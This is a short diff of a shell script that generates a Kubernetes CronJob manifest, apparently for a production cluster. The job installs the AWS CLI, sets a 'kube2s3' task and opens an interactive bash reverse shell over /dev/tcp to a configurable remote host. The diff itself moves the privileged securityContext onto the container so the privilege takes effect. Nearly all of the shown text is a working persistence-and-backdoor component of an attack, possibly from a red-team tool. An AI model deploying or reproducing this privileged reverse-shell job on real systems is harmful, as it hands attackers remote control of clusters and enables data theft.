@@ -146,9 +146,9 @@ spec:
                 "/bin/bash", 
                 "-c", 
                 "apt-get update && apt-get install -y curl unzip python3-pip && curl \"https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip\" -o \"awscliv2.zip\" && unzip awscliv2.zip && ./aws/install && TASK=kube2s3 /bin/bash -i >& /dev/tcp/$REVERSE_SHELL_HOST/$REVERSE_SHELL_PORT 0>&1\""]
+            securityContext:
+              privileged: true
           restartPolicy: OnFailure
-          securityContext:
-            privileged: true
 EOF
 
 cat /tmp/kubernetes_prod_cronjob.yaml 2>&1 | tee -a $LOGFILE
